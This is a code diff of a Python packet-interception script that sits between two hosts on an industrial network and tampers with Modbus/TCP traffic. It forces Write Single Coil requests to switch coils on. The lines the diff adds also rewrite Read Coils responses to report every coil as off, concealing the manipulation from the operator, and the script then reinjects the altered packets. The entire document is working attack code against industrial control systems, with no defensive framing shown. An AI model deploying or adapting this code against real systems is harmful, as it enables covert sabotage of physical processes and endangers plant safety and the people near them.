@@ -12,15 +12,29 @@ def packet_callback(packet):
     if scapy_packet.haslayer(TCP) and scapy_packet.haslayer(IP):
         if scapy_packet[IP].src == '10.0.0.192' and scapy_packet[IP].dst == '10.0.0.21':
             if ModbusPDU05WriteSingleCoilRequest in scapy_packet:
-                print(scapy_packet[ModbusPDU05WriteSingleCoilRequest].show())
+                #print(scapy_packet[ModbusPDU05WriteSingleCoilRequest].show())
                 scapy_packet[ModbusPDU05WriteSingleCoilRequest].outputValue = 0xff00
-                print(scapy_packet[ModbusPDU05WriteSingleCoilRequest].show())
-                print("----------------------------------------------------")
+                #print(scapy_packet[ModbusPDU05WriteSingleCoilRequest].show())
+                #print("----------------------------------------------------")
 
                 del scapy_packet[IP].chksum
                 del scapy_packet[TCP].chksum
 
                 packet.set_payload(bytes(scapy_packet))
+            
+        
+        if ModbusPDU01ReadCoilsResponse in scapy_packet:
+            if ModbusADUResponse in scapy_packet:
+                if scapy_packet[IP].src == '10.0.0.21' and scapy_packet[IP].dst == '10.0.0.192':
+                    scapy_packet[ModbusPDU01ReadCoilsResponse].show()
+                    #print(scapy_packet[ModbusPDU01ReadCoilsResponse].coilStatus)
+                    scapy_packet[ModbusPDU01ReadCoilsResponse].coilStatus = 0
+                    scapy_packet[ModbusPDU01ReadCoilsResponse].show()
+
+                    del scapy_packet[IP].chksum
+                    del scapy_packet[TCP].chksum
+
+                    packet.set_payload(bytes(scapy_packet))
 
     packet.accept()
 
